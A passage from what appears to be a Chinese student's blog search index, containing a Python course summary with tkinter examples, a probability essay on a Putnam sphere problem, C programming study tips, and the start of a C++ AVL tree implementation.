\u0026#39;c\u0026#39;: 99} for key, val in d.items(): print(key +\u0026#39;=\u0026#39;+ val) # b = 98 # a = 97 # c = 99 (unordered) # Or instead: [key +\u0026#39;=\u0026#39;+ val for key, val in d.items()] # [\u0026#39;b=98\u0026#39;, \u0026#39;a=97\u0026#39;, \u0026#39;c=99\u0026#39;] 上面的第二种方法用到了列表生成式，它还可以这样用，来把列表中的字符串全部变成小写：\nL = [\u0026#39;RESTful\u0026#39;, \u0026#39;LaTeX\u0026#39;, \u0026#39;GitHub\u0026#39;, \u0026#39;iPhone\u0026#39;] [s.lower() for s in L] # [\u0026#39;restful\u0026#39;, \u0026#39;latex\u0026#39;, \u0026#39;github\u0026#39;, \u0026#39;iphone\u0026#39;] 可以想到，在生成方法已知的情况下，直接求出整个列表常常是没有必要的。为了边循环边计算，Python 提供了生成器对象：\ng = (s.lower() for s in L) next(g) # \u0026#39;restful\u0026#39; next(g) # \u0026#39;latex\u0026#39; # Generate Fibonacci sequence(less than 2000) def fib(): prev, curr = 0, 1 while True: yield curr prev, curr = curr, curr + prev f = fib() for i in f: if i \u0026gt; 2000: break print(i) 生成器对象可以用 next() 来生成下一个元素，但由于它是可迭代的，我们通常习惯用循环来遍历其元素。此外，在上面的例子中，fib() 并不是一个函数，而是一个生成器，因为其定义中带有 yield 关键字。\n那么，为什么 next() 可以返回生成器生成的下一个元素呢？通过查阅文档发现，next() 的参数需要是一个迭代器对象。因此我们知道，生成器是一种迭代器。\n然而，isinstance([], Iterator) 语句的结果却是 False，意味着列表（字典、字符串）并不是迭代器对象，尽管可以用 iter() 进行强制转换。这揭示了迭代器对象作为流对象的最大优点，即惰性计算。\n同时，迭代器迭代完毕后，我们注意到 Python 解释器会抛出 StopIteration 的错误。这是一个典型的异常，而接下来我们要做的就是处理这一异常。异常处理语法有点类似 Java，这里我们用一个常规的文件处理（这里没有介绍，因为比较简单，而且和 C++ 太相似了）的例子来说明：\nimport sys import time f = None try: f = open(\u0026#34;poem.txt\u0026#34;) while True: line = f.readline() if len(line) == 0: break print(line, end=\u0026#39;\u0026#39;) sys.stdout.flush() print(\u0026#34;Press ctrl+c now\u0026#34;) time.sleep(2) except IOError: print(\u0026#34;Could not find file poem.txt\u0026#34;) except KeyboardInterrupt: print(\u0026#34;!! You cancelled the reading from the file.\u0026#34;) finally: if f: f.close() print(\u0026#34;(Cleaning up: Closed the file)\u0026#34;) # Or use instead: with open(\u0026#34;poem.txt\u0026#34;) as f: for line in f: print(line, end=\u0026#39;\u0026#39;) 这里将可能产生异常的代码块放在了 try: 后面，并在 except: 后捕获并处理异常，finally: 进行善后工作。另一种方案是用 with...as... 语句来简化资源的获取与释放。\n我们也可以自己定义一种异常，并在 try: 语句块中用 raise 异常名 抛出异常。这里就需要我们定义一种异常类，并产生一个异常对象。于是我们接下来学习了面向对象编程。\n对于面向对象程序设计，经过 C++ 与 Java 两门语言的学习，我再熟悉不过了，因此许多 OOP 中重要的概念，如封装、继承、多态等这里不会再赘述。\n在任何类的对象方法的参数列表开头都会有一个 self 参数，引用对象本身，作用相当于 this 指针； 类的构造函数名称为 __init__； 私有变量以 __ 开头（但是不能以 __ 结尾！），从外部访问这一变量只会新增一个同名变量；本质：Name-mangling 继承：class 派生类 (基类):；继承元组中也可以有多个基类，即多重继承； 所有方法都是虚拟的（C++ virtual 关键字）； type(对象) 返回对象类型；isinstance() 对于继承的类更方便；dir() 获取一个对象的所有属性和方法； 可以定义类属性和类方法，后者需要装饰器（不在课程范围内）@classmethod 最后以一个简单的例子结束 OOP 部分：\nclass Fib: def __init__(self): self.prev = 0 self.curr = 1 def __iter__(self): return self def __next__(self): val = self.curr self.curr += self.prev self.prev = val if self.prev \u0026gt; 2000: raise StopIteration return val f = Fib() for i in f: print(i, end=\u0026#39; \u0026#39;) 最后一点额外的内容是匿名函数，简单来说就是 lambda 参数: 表达式 的形式，其中 “参数” 可选，“表达式”即返回值。另外，lambda 表达式本身也可以作为函数的返回值。\n图形化编程 # 在课程最后我们学习了基于 tkinter 的图形化编程, 为此我们需要 import tkinter 模块。从一个简单的例子开始：\nfrom tkinter import * def showPosEvent(event): print(\u0026#39;Widget=%s X=%s Y=%s\u0026#39; % (event.widget, event.x, event.y)) def onLeftClick(event): print(\u0026#39;Got left mouse button click:\u0026#39;, end=\u0026#39;\u0026#39;) showPosEvent(event) tkroot = Tk() labelfont = (\u0026#39;courier\u0026#39;, 20, \u0026#39;bold\u0026#39;) widget = Label(tkroot, text=\u0026#39;Hello bind world\u0026#39;) widget.config(bg=\u0026#39;red\u0026#39;, font=labelfont) widget.config(height=5, width=20) widget.pack(expand=YES, fill=BOTH) widget.bind(\u0026#39;\u0026lt;Button-1\u0026gt;\u0026#39;, onLeftClick) widget.focus() tkroot.title(\u0026#39;Click Me\u0026#39;) tkroot.mainloop() 我们用 Tk 创建主窗体，Label 创建一个标签，通过其 config 方法设置各种属性后，用 pack 方法装入主窗体中。\n为了让控件能响应事件，使用 bind 方法，第一个参数表示事件类型，可以有 \u0026lt;Button-1\u0026gt;(鼠标左键), \u0026lt;Button-2\u0026gt;(鼠标中键), \u0026lt;Button-3\u0026gt;(鼠标右键), \u0026lt;Double-1\u0026gt;(左键双击), \u0026lt;B1-Motion\u0026gt;(左键拖动), \u0026lt;Key-Press\u0026gt;, \u0026lt;Up\u0026gt;, \u0026lt;Return\u0026gt; 等等; 第二个参数是检测到事件发生时的行为，用一个函数名表示（类似 Java 的 EventListener）。该函数的参数是一个 event 对象，其属性 widget 表示事件作用的控件，x 和 y 表示坐标（如果有的话）。\n最后，这里用 focus 方法设置焦点，mainloop 使窗体开始循环等待，也就是真正运行起来。运行效果： 这里用的控件是 Label，对于其它控件同理，如 Button, Frame, Entry, Checkbutton, Radiobutton, Scale 等等。\n除此之外，tkinter 也提供了一些封装好的对话框供我们调用。例如：\nfrom tkinter.filedialog import askopenfilename from tkinter.colorchooser import askcolor from tkinter.messagebox import askquestion, showerror from tkinter.simpledialog import askfloat from tkinter import * demos = { \u0026#39;Open\u0026#39;: askopenfilename, \u0026#39;Color\u0026#39;: askcolor, \u0026#39;Query\u0026#39;: lambda: askquestion(\u0026#39;Warning\u0026#39;, \u0026#39;You typed\u0026#34;rm *\u0026#34;\\nConfirm?\u0026#39;), \u0026#39;Error\u0026#39;: lambda: showerror(\u0026#39;Error!\u0026#39;, \u0026#34;He\u0026#39;s dead, Jim\u0026#34;), \u0026#39;Input\u0026#39;: lambda: askfloat(\u0026#39;Entry\u0026#39;, \u0026#39;Enter credit card number\u0026#39;) } class Demo(Frame): def __init__(self, parent=None, **options): Frame.__init__(self, parent, **options) self.pack() Label(self, text=\u0026#34;Basic demos\u0026#34;).pack() for (key, value) in demos.items(): Button(self, text=key, command=value).pack(side=TOP, fill=BOTH) if __name__ == \u0026#39;__main__\u0026#39;: Demo().mainloop() 点击 Open 按钮，会出现文件选择的对话框；Color 则对应颜色选择对话框；Query 对应消息提示框 (带问号 + 是 / 否选项)；Error 出现错误提示框；Input 则弹出带文本框的对话框，允许用户进行输入。\n从这个例子我们也可以发现，tkinter 和面向对象的结合同样十分便捷。运用这种面向对象的思想，我们实现一个按钮类，用于在退出时弹出确认对话框：\nfrom tkinter import * from tkinter.messagebox import askokcancel class Quitter(Frame): def __init__(self, parent=None): Frame.__init__(self, parent) self.pack() widget = Button(self, text=\u0026#39;Quit\u0026#39;, command=self.quit) widget.pack(side=LEFT, expand=YES, fill=BOTH) def quit(self): ans = askokcancel(\u0026#39;Verify exit\u0026#39;, \u0026#34;Really quit?\u0026#34;) if ans: quit() if __name__ == \u0026#39;__main__\u0026#39;: Quitter().mainloop() 此外，除了用上面提到的 pack 方法可以管理控件布局外，我们还可以使用 grid 布局管理器。它将控件放置到一个二维的表格里，主控件被分割成一系列的行和列，表格中的每个单元（cell）都可以放置一个控件。例如：\nfrom tkinter import * master = Tk() Label(master, text=\u0026#34;First\u0026#34;).grid(row=0,column=0, sticky=W) Label(master, text=\u0026#34;Second\u0026#34;).grid(row=1,column=0, sticky=W) e1 = Entry(master) e2 = Entry(master) e1.grid(row=0, column=1,sticky=(E, S)) e2.grid(row=1, column=1,sticky=(E, S)) master.mainloop() 效果：\n需要注意的是，pack 布局管理器与 grid 布局管理器不应在一个窗口中混合使用。\n如果我们想在窗体中显示图片也同样可行。这需要用到 Canvas 对象：\npicdir = \u0026#34;pic.gif\u0026#34; from tkinter import * win = Tk() img = PhotoImage(file=picdir) can = Canvas(win) can.pack(fill=BOTH) can.create_image(20, 20, image=img, anchor=NW) win.mainloop() 这是最简单的在窗体中显示一张图片的方法，同样我们可以给 Button 的 img 属性赋值来在按钮上显示图片。\n所谓 Canvas 对象，即画布对象，其功能远不止于绘制一张已有的图片。它不仅拥有其它控件类似的属性与方法，还有自带的许多绘图方法，如 create_line, create_oval, create_rectangle, create_arc, create_image, create_text, create_window 等。根据其参数列表传入适当的参数，可以完成大部分基本的绘图功能。结合前面提到的鼠标拖动事件与面向对象编程，完全可以让用户自己在窗体内创作图像。\ntkinter 同样支持 listbox 控件，下拉菜单与窗体菜单，带滚动条的文本框等等, 他们的方法多样，但也有许多相似之处。下面是两个简单的示例：\n第一个是菜单栏的测试，第二个是一个简单的文本编辑器。\n到这里，这门课程的内容差不多结束了。然而 Python 的功能远远不止这些，课程的结束也并不意味着 Python 学习的结束。在学习完课程之后，我又尝试写了基于 Python 的爬虫——根据豆瓣电影排行来自动推荐电影，并通过微信自动回复的接口实现交互。\n项目地址：https://github.com/SignorMercurio/WechatFilmRecommender\n参考资料 # Python 教程 - 廖雪峰的官方网站 简明 Python 教程 教学课件 ","date":"2019-01-06","permalink":"/posts/python-summary/","section":"Posts","summary":"\u003cp\u003e期末作业居然是写综述。。有点无聊啊。\u003cstrong\u003e这不是 Python 教程。\u003c/strong\u003e\u003c/p\u003e","title":"《Python 编程技术》期末作业"},{"content":"一道数竞压轴题的直观解法。\n背景 # 这篇报告的灵感来源于一道 1992 年普特南数学竞赛真题，原题的表述如下：\nA–6 Four points are chosen at random on the surface of a sphere. What is the probability that the center of the sphere lies inside the tetrahedron whose vertices are at the four points? (It is understood that each point is independently chosen relative to a uniform distribution on the sphere.)\n题目大意：在球面上随机选择四个点构成四面体，求球心落在该四面体内（含边界）的概率。\n初步思路 # 减小规模 # 对于这类空间几何问题，容易想到通过 “降维处理” 来降低思维难度。因此，我们不妨考虑如下问题：\n在圆上任取三个点构成三角形，求圆心落在该三角形内（含边界）的概率。\n这里我们再次降低问题的规模：假设三个点分别为 P1,P2,P3，固定 P1,P2 两点，再在圆上随机取一点 P3。改变 P3 的位置，可以发现，当且仅当 P3 在一段特定的弧上时，圆心在三角形内，而这段弧的长度与圆的周长的比值即为二维情况下的的答案。\n这里值得一提的是，上一段最后一句话看似是一个显然的结论，实际上却暗藏玄机。我们认为，P3 能够取的所有点的集合——也就是这段特定的弧，的长度占圆周长的比例就是要求的概率，而这个命题成立的前提是：三角形的顶点在圆上是均匀分布的。这看起来同样很显然，不过这个等可能性假设会决定样本空间的大小，有时甚至能影响结果的正确性！\n这提醒我们，概率论并不像表面看上去那样，是在单纯直观地计算事件发生的概率——对样本空间的严谨定义常常被人忽视。实际上，在上世纪初法国数学家贝特郎已经提出了 “贝特郎奇论”，用不同的等可能性假设计算出同一个问题的三个 “正确答案”，推动了概率论向公理化的方向发展。\n回到正题，显然弧长与 P1,P2 的选择有关。分别过 P1,P2 以及圆心作直线，那么这两条直线将把圆分成四段弧。P1,P2 相对的那段弧的长度即为所求。为了求出这段弧的平均长度，我们考虑两种极限情况：（1）P1,P2 重合，该弧长等于 0；（2）P1,P2 位于圆两端（即 P1P2 为圆的一条直径），该弧长等于圆的半周长。又因为 P1,P2 的选取是任意的，极限情况的均值，也就是 1/4 周长，就是这段弧长的平均值。我们得到，二维情况下的答案为 1/4。\n同样地，这里取（最大值 + 最小值）的均值也是因为，我们已经假定 P1,P2 在圆上均匀分布——因此弧长在 0 到半周长也是均匀分布的。于是我们求出弧的平均长度，实际上就是求出了圆心落在三角形内（含边界）的概率期望。\n推广 # 推广到三维，假设四个点分别为 P1,P2,P3,P4，我们固定 P1,P2,P3 点，并且分别过 P1,P2,P3 以及球心作直线，这些直线两两决定一个平面。画出图像后可以看到，球面被平面分为了 8 个区域，而 P4 需要落在 P1,P2,P3 相对的那个区域里。\n然而，有别于二维情况，让 P1,P2,P3 变化并设法求出那块区域的平均面积是十分困难的。也许可以借助曲面积分解决，但步骤将十分繁琐。因此，我们需要变换思路。\n变换思路 # 低维情况另解 # 回到二维的情况，既然刚才的方法推广时遇到了困难，那么能不能换一种更容易推广的方法呢？这需要对问题作进一步的简化。\n考虑刚才的解法中的核心元素：新增的两条辅助线。由于这两条辅助线简化了问题，我们尝试将问题只用这些新增的元素重新描述。在这里，我们不再考虑随机选取三个点，而是考虑：随机选择两条过圆心的直线，每条直线对应圆上的两个点。\n于是，对于第一条直线，我们在它与圆的两个交点中选择一个，定为 P1。类似地，对另一条重复操作得到 P2。这种做法等价于在圆上随机选取两点，但是，正如我们后面将看到，却更容易推广到三维了。\n此外，我们不妨交换原题中操作的顺序，即先随机选取 P3，然后再决定 P1 与 P2 的位置。这样，当选择好两条直线后，P1 和 P2 的位置只剩下了四种情况，每种情况都是等可能的。但是，容易证明有且仅有一种情况会使得 P3 落在 P1,P2 相对的圆弧上。因此，我们又一次得到了答案 1/4。\n可以看到，调整了随机选点的过程后，我们用一种截然不同的方式求得了答案。更重要的是，将这一过程推广到三维极其容易。\n重新推广 # 任取球面上一点 P4，再任取三条过球心的直线。对每条直线，在它与球面的两个交点中选取一个作为 Pi, i=1,2,3。我们得到 2^3=8 种等可能结果，其中有且仅有一种结果能使得 P4 落在 P1,P2,P3 相对的球面区域上。即，有且仅有一种结果使得球心落在该四面体内。显而易见，1/8 就是这个问题的答案了。\n结论与启示 # 必须承认，上述解法是基于几何直观的，离开这种几何直观性，要如何证明我们得到的结果是正确的呢？换而言之，怎么把解答的过程用数学语言写下来？\n这个问题在数学中十分常见：理解问题并知道关键是一回事，但掌握相关背景知识，更正式、清晰地阐述这个理解，完全就是另一回事了。\n但是从这个问题中获得的启示不应该是这个答案本身，而是找到关键想法的思维方式。即：不断寻找问题的简化版本，并在过程中关注那些新添加的结构（本题中是两条辅助线），尝试用新结构来重述整个问题。\n此外，更值得强调的是解题过程中的严谨性。概率论在诞生之初，（也许是由于过分强调实用的原因）并不严谨，也没有一个稳固的公理体系。而如今，运用公理逐渐完备的概率论进行计算时，我们也必须注意避免犯下隐蔽的 “假设性错误”，由于想当然的假设和自己补充的条件而得出错误的结论。和数学领域其它学科一样，是严谨性使得概率论来源于生活却又高于生活。\n参考资料：\nhttp://kskedlaya.org/putnam-archive/1992.pdf http://lsusmath.rickmabry.org/psisson/putnam/putnam-web.htm http://kskedlaya.org/putnam-archive/2005.pdf http://kskedlaya.org/putnam-archive/2005s.pdf ","date":"2018-12-14","permalink":"/posts/probability-report/","section":"Posts","summary":"\u003cp\u003e一道数竞压轴题的直观解法。\u003c/p\u003e","title":"概率论课程报告"},{"content":"被邀请分享 C 语言学习经验，于是写了点东西给学生会做推送。\nQ\u0026amp;A # Q1: 大家一开始初学的时候程序里有很多很多的 bug，大多是语法符号规范的错误，如何避免这些问题呢？\nA1: 答案很可能要令人失望：多写代码。尽管听起来老生常谈，但是当代码量达到一定水平后，忘加分号或是把 == 写成 = 之类的语法错误几乎不会在你的代码中出现，也不需要再刻意去规避。\n不过，在多写的基础上，仍有一些小技巧或许能有帮助：\n认真阅读编译器给出的警告（warning）信息，明白其中的缘由，并且（如果不是有意为之）消除它们，尽管有时 warning 不会影响程序正确性。\n还是让聪明的编译器来帮忙：对于把 == 写成 = 的问题，可以考虑写 if (true == flag) 而不是 if (flag == true)。这样，当你写成 = 号时，第一种形式会导致编译错误。当然，如果做到了第一条，你不会需要这个技巧。\n部分 IDE 或文本编辑器插件支持即时错误提示功能，这样可以在你写出错误语法的第一时间提醒你改正。不过不要太依赖这种功能。\n与上一条相反，如果觉得自己足够熟练了，试着离开 IDE 写代码，并用命令行下的 gcc 编译运行。由于这样做不如在 IDE 内运行方便，你也许会在写代码时十分小心，并在写完代码后反复检查来减少重复编译运行的次数（也许不会）。\nQ2: 作为萌新的我们，不知道怎么着手学习 C 语言，对于基础知识这块非常的薄弱，书上的内容感觉不是很系统，有什么好方法呢？能不能给我们推荐一些有用的参考资料呢？\nA2: 老实说，我觉得学校用的 K\u0026amp;R 足够好了，并且也不太可能有什么 C 语言书籍能超越它。不过如果觉得看得很累的话，不妨试试国内的任意一本豆瓣评分较高的 C 语言书籍。虽然它可能没那么好，甚至会误导人，但至少能够帮助没有基础的同学建立一些基本概念。\n当然，如果你不屑看国内的书籍，这两本书也可以作为参考：\nC Programming: A Modern Approach K.N.King 著\nC Traps and Pitfalls Andrew Koenig 著\n（对任何国外的专业书籍请尽可能阅读原版）\n最重要的是，在阅读时必须完成一部分书上的习题（乐意的话做 OJ 也行），通过实践进步是最快的。但是如果你真的想精通 C 语言而不是为了通过考试，仅仅快还不够——在代码量达到，比如 300 行左右时，请回头认真阅读 K\u0026amp;R。\nQ3: 理论课上学到的知识，在实践课上不是很会操作，怎么尽快地能够应用呢？\nA3: 要 “尽快” 的话，无疑需要：\n多看别人的优质代码；\n自己多写代码。\n学校的 OJ 平台提供了一些相当有用的功能，如将题目按 Reward 排序，在 AC 后可以查看他人代码等等。利用这些功能从低难度题开始练习，并且在自己完成后观赏（嗯，观赏）优秀的代码（如 Fastest，Shortest 等），往往会有新的体会。另外，务必学会使用搜索引擎，但同样不要太依赖。\n如果做 OJ 题让你感到很无趣，不妨试试小项目驱动的方法：学完结构体后，你差不多就可以写一个控制台里的文字 RPG 游戏了（好吧，可能还是不那么有趣）；或者，可以写一些小的实用工具（科学计算器，xx 管理系统，文件批处理工具，表白程序等等）；你甚至可以尝试去写一个伪 Shell。\nQ4: 我们怎么才能判断什么时候该用什么函数？\nA4: 我猜这里的 “函数” 是指“库函数”。\n要背出所有库函数的功能显然不太现实，那么范围缩小到 “常用” 的会怎样？实际上，一个好用的方法是在做题时（或者做小项目时），当你需要一个功能，试着描述这个功能，打到搜索框里，并在前面加上“C”（不带引号）。可以选择看国内的博文，但我推荐查阅 C 标准库的官方文档。\n有一次我忘记了 strcpy 函数的参数顺序了，于是我很快查到了并关掉了网页。突然我因为别的事离开了电脑几分钟，回来时我又一次忘了那个顺序。这是在查阅资料时必须杜绝的现象，解决方法是：不要只看对你有用的部分，而是每次查阅都尽量深入地了解这个函数——一些用法也许很难一次记住，但经过多次查阅和实践后，也许你就能对 C 标准库中的常用函数如数家珍了。\nQ5: 拿到一个问题我们该怎么着手处理呢？步骤是什么呢？\nA5: 每个人都有不同的方法，我仅提供我自己的作为参考，未必适合每一个同学：\n确保正确理解了题意。读完题就开始写，写到一半发现题意理解错的体验，包括我在内的很多人都有过。\n由易到难。不要先考虑问题的最优解法，而是先从思维难度低的，或许看起来有点 low 的做法开始，设法改进你的算法。你甚至可以写一个正确性可以保证但速度较慢的版本，与你写的更优解法的版本进行对拍（请自行搜索如何对拍）。\n想好完整的思路后再碰键盘。也就是说，一旦你开始写代码，尽量减少停下来长时间思考的时间。这很难，所以不强求。\n最重要的，熟悉常用思路 / 算法。例如穷举、模拟、贪心、排序、字符串处理、二分、递归 - 记忆化搜索 - DP 等等。在许多 OJ 上，题目会按它所用到的思路 / 算法来分类（如 EOJ 上叫做 tag）。当你足够熟悉这些常用思路 / 算法后，许多题可以匆匆一瞥就想到算法了——而这时，可能已经成功了 50%（也可能只成功了 5%）。\n学会调试程序（debugging）。绝大多数情况下程序不可能一次运行就得到正确结果，花在查错改错上的时间往往比思考时间 + 实际编写程序的时间更长。而至少在查错上，**gdb **可以帮助我们节省不少时间。通常 C 语言 IDE 都带有 gdb 调试器，**一定要学会使用它！**另外可以配合 printf 变量的值进行调试。\nQ6: 对于 OJ 这个系统，我们怎么利用它呢？\nA6: 取决于你的目标。\nACMer 默认已经有一定基础（比如：能轻松解决 EOJ 上大部分 Reward \u0026lt;= 4 的题）。买本书学算法（比如 “紫书”、“挑战” 等），做书上练习，并在各大 OJ 上进行专题练习。多打比赛（CF / EOJ 月赛），怎么样都别抄代码。之后就看自己了，我不打 ACM 所以不能给出有用的建议。\n对程序设计与算法很感兴趣，想要深入学习的同学 巩固好基础（多写题 + 读 K\u0026amp;R）。推荐读紫书（《算法竞赛入门经典》），能认真读完并且每章多少做掉一部分习题的话，你的水平应该已经超过一部分 ACMer 了。之后可以选择专题练习（别抄代码），数学好的也可以选择去读《算法导论》一类的书。\n想实践课和实训课拿高绩点的同学 到 EOJ 的 Gym 里找实训题库，做题、总结思路 / 算法，后者更重要。看完题就知道怎么做的题（指代码结构在脑子里都组织好了），不做；想了半小时没思路可以查题解但是不要看代码，依然不会做的话，也放弃。一天就能做十题和十天只能做一题的那种题，对实力的提升都没有太大帮助。 另外，实训 4.0 可遇不可求，不要为此花费太多时间在 OJ 上，即使你像我一样喜欢做题而完全不觉得累，因为其他课程也是很重要的。\n想通过实践课和实训课考试的同学 听课，做 OJ 上老师布置的题。有时间的话，从 Reward 较低的题开始做起，提升熟练度。百题过后，通过应该没有难度了。\n所有人 优雅的 EOJ 提供了用户手册，如果你真的想好好利用这个平台的话，请阅读一下。一些其它 OJ 也有类似的文档。但是 Online Judge 只是平台，Coding 才是关键。必须在最后强调的一点是：尽力独立思考，绝对不抄代码。\n经验分享 # 宽泛的内容上面的回答已经基本涵盖了，下面是 30 条具体的东西，请结合搜索引擎食用。\n编译与链接 # 一个编译单元中定义的全局变量初始值不要依赖定义在另一个编译单元中的全局变量初始值。（链接器不保证初始化顺序） 数据类型 # 一个 void * 类型的指针是一个合法的指针，常用于函数参数中用来传递一个函数与其调用者之间约定好类型的对象地址；而一个值等于 NULL 的指针虽然也是一个合法的指针，但不是一个有效的指针。\n标准 C 语言允许任何非 void * 类型指针和 void * 类型指针之间进行直接的相互转换，如 int * 转换为 void * 再转换为 double *，然而这样做存在不易察觉的安全问题（内存扩张 / 截断）。\n强制转换时必须同时确保内存访问的安全性和转换结果的安全性，并且尽量用显式的转换。\n标识符与表达式 # 避免用前导 _ 和 __ 定义标识符，因为一些内部名称和预定义的宏是这样命名的。\n标识符命名应该遵循 KISS 原则（Keep It Simple \u0026amp; Stupid），并且应该能自说明。\n别记运算符优先级，用括号。\n用 \u0026amp;\u0026amp; 时把最可能 false 的子表达式放左边，用 || 时把最可能 true 的子表达式放左边。（短路原则）同理，if/else 结构中把最可能 true 的条件放前面。\n浮点数比较不要用 == 和 !=，而是像这样：\n#define EPS 1e-6 // 设置要求的精度 if (fabs(x - y) \u0026lt;= EPS); //x 等于 y if (fabs(x - y) \u0026gt; EPS); //x 不等于 y /* * 其中 x,y 是浮点数。fabs 函数在 math.h 中，计算浮点数绝对值。 * 不过对浮点数用\u0026gt;和 \u0026lt;是可以的，不过不建议用!(x\u0026gt;y) \u0026amp;\u0026amp; !(x\u0026lt;y) 来判断相等，因为这和 x==y 语义等价。 */ 看到表达式里出现 error / warning 时，想想运算符两端是不是类型一致。不要把指针和 0 比较，也不要把数值和 NULL 比较。\n循环 # C 按先行后列的顺序存储数组元素，所以两层 for 遍历时，先行后列比先列后行快几十倍。这听起来不可思议（总循环次数是一样的），不妨写两个程序试试？（原理见神书 CSAPP）\n循环体内存在逻辑判断，并且循环次数很多时，试试把逻辑判断移到外面。\n少用 goto，除非要从多层循环里直接跳出来。\n函数 # 函数调用中参数传递的本质就是用实参来初始化形参而不是替换形参。\n如果参数是指针，且仅做输入用，则应在类型前加 const，防止该指针指向的内存单元被无意修改。\n不要省略返回值类型，没返回值就用 void。标准 C 语言中，不加类型说明的函数一律按 int 类型处理。\n函数名和返回值在语义上不可冲突。不要将正常值和错误标志混在一起返回。建议正常值用输出参数获得，而错误标志用 return 返回。强调这个是因为 C 标准库中典型的反面教材：getchar()。看函数名似乎应该返回 char 类型，实际上它却返回 int 类型，只因为要返回错误标志 EOF，也就是 -1。\nreturn 语句不可返回指向堆栈（如函数内局部变量）的指针，因为该内存单元在函数体结束时被自动释放。\n尽管语法允许，不要在内层程序块中定义会屏蔽外层程序块中同名标识符的标识符，否则会损害程序的清晰性。\n学用 assert 宏。\n指针 # 不管什么指针变量都要在声明的时候就初始化它，NULL 也行。\n将指针加 / 减正整数 i 等价于加 / 减 i*sizeof(指针所指数据类型)。\n传指针本质上是传地址。\n表示 a 数组第 4 个元素 a[3] 居然还可以写成 3[a]，这是为什么？（我开始写数组相关的内容了，却还是在指针板块，这又是为什么？）\n多维数组作为函数参数时，为什么不需要说明第一维的大小而必须说明后面所有维的大小？\n即使你觉得自己不会忘记字符数组末尾的 \\0，你还是会忘记。（有些库函数不会自动加 \\0）\n对下面的代码，输出 p 和 *p 有什么不同？\nchar ch = \u0026#39;a\u0026#39;; char *p = \u0026amp;ch; 函数指针了解一下。\n结构体 # 你可以用 “位域” 指定 struct 中成员变量所占的 bit 数（而不是 byte），只不过成员类型必须是 int/unsigned int/signed int 之一。\n根据自然对齐的原理，合理安排成员变量的声明顺序。（详见神书 CSAPP）\n最后提醒大家，程序的正确性固然重要，但是一定不要轻视其可读性、可维护性、健壮性、时空效率等等。不过也不用纠结大括号换不换行，缩进用 Tab 还是空格的问题。祝大家都能写出清晰、高效的优质代码！\n","date":"2018-10-17","permalink":"/posts/c-tips/","section":"Posts","summary":"\u003cp\u003e被邀请分享 C 语言学习经验，于是写了点东西给学生会做推送。\u003c/p\u003e","title":"一点 C 语言的经验"},{"content":"数据结构上机课花了点时间实现的两种相对复杂的数据结构。基本上在抄书。\nAVL 树 # 包含了二叉树、二叉查找树和 AVL 树的实现，不过毕竟没有真正学过 C++，对 OOP 也还不算很熟悉，碰到了一些问题：\n继承的类也不能访问父类的 private 成员，不过可以用 using 父类:: 成员名 的方式访问父类的 protected 成员 子类中重载了父类的某个成员函数后，对子类和父类中的该函数同时加 virtual 关键字修饰，可以在运行时判断具体需要调用的函数是哪一个版本 代码 # #include \u0026lt;iostream\u0026gt; #include \u0026lt;stack\u0026gt; using namespace std; enum Balance_factor {left_higher, equal_height, right_higher}; enum Error_code {success, not_present, duplicate_error}; template \u0026lt;class Record\u0026gt; struct Binary_node { Record data; Binary_node\u0026lt;Record\u0026gt; *left, *right; Binary_node() {left = right = NULL;}; Binary_node(const Record \u0026amp;x) {data = x; left = right = NULL;}; virtual void set_balance(Balance_factor b) {}; virtual Balance_factor get_balance() const {return equal_height;}; }; template \u0026lt;class Record\u0026gt; class Binary_tree { public: Binary_tree() {root = NULL; count = 0;}; bool empty() const {return !root;}; int size() const {return count;}; int height() const { if (!count) return 0; int tmp, i; for (tmp = 1, i = 0; tmp \u0026lt;= count; ++i) tmp \u0026lt;\u0026lt;= 1; return i; } void preorder(void (*visit)(Record \u0026amp;)) {recursive_preorder(root, visit);}; void inorder(void (*visit)(Record \u0026amp;)) {recursive_inorder(root, visit);}; void postorder(void (*visit)(Record \u0026amp;)) {recursive_postorder(root, visit);}; void insert(Record \u0026amp;); protected: Binary_node\u0026lt;Record\u0026gt; *root; int count; void recursive_preorder(Binary_node\u0026lt;Record\u0026gt; *sub_root, void (*visit)(Record \u0026amp;)) { if (sub_root) { (*visit)(sub_root-\u0026gt;data); recursive_preorder(sub_root-\u0026gt;left, visit); recursive_preorder(sub_root-\u0026gt;right, visit); } } void recursive_inorder(Binary_node\u0026lt;Record\u0026gt; *sub_root, void (*visit)(Record \u0026amp;)) { if (sub_root) { recursive_inorder(sub_root-\u0026gt;left, visit); (*visit)(sub_root-\u0026gt;data); recursive_inorder(sub_root-\u0026gt;right, visit); } } void recursive_postorder(Binary_node\u0026lt;Record\u0026gt; *sub_root, void (*visit)(Record \u0026amp;)) { if (sub_root) { recursive_postorder(sub_root-\u0026gt;left, visit); recursive_postorder(sub_root-\u0026gt;right, visit); (*visit)(sub_root-\u0026gt;data); } } }; template \u0026lt;class Record\u0026gt; void Binary_tree\u0026lt;Record\u0026gt;::insert(Record \u0026amp;x) { if(empty()) { root = new Binary_node\u0026lt;Record\u0026gt;(x); ++count; return; } stack\u0026lt;int\u0026gt; numbers; int item = 0, tmpcount = size(); while (tmpcount\u0026gt; 0) { numbers.push((tmpcount\u0026amp;1) ? 1:2); tmpcount = (tmpcount-1)\u0026gt;\u0026gt;1; } Binary_node\u0026lt;Record\u0026gt; *current = root; while (numbers.size() \u0026gt; 1) { item = numbers.top(); if (item == 1) current = current-\u0026gt;left; if (item == 2) current = current-\u0026gt;right; numbers.pop(); } item = numbers.top(); if (item == 1) current-\u0026gt;left = new Binary_node\u0026lt;Record\u0026gt;(x); if (item == 2) current-\u0026gt;right = new Binary_node\u0026lt;Record\u0026gt;(x); ++count; } template \u0026lt;class Record\u0026gt; class Search_tree: public Binary_tree\u0026lt;Record\u0026gt; { public: Error_code insert(const Record \u0026amp;new_data) { Error_code result = search_and_insert(root, new_data); if (result == success) ++count; return result; } Error_code remove(const Record \u0026amp;target) { Error_code result = search_and_destroy(root, target); if (result == success) --count; return result; } Error_code tree_search(Record \u0026amp;target) const { Error_code result = success; Binary_node\u0026lt;Record\u0026gt; *found = search_for_node(root, target); if (!found) result = not_present; else target = found-\u0026gt;data; return result; } protected: using Binary_tree\u0026lt;Record\u0026gt;::root; using Binary_tree\u0026lt;Record\u0026gt;::count; Binary_node\u0026lt;Record\u0026gt; *search_for_node(Binary_node\u0026lt;Record\u0026gt;* sub_root, const Record \u0026amp;target) const; Error_code search_and_insert(Binary_node\u0026lt;Record\u0026gt; * \u0026amp;sub_root, const Record \u0026amp;new_data); Error_code search_and_destroy(Binary_node\u0026lt;Record\u0026gt;* \u0026amp;sub_root, const Record 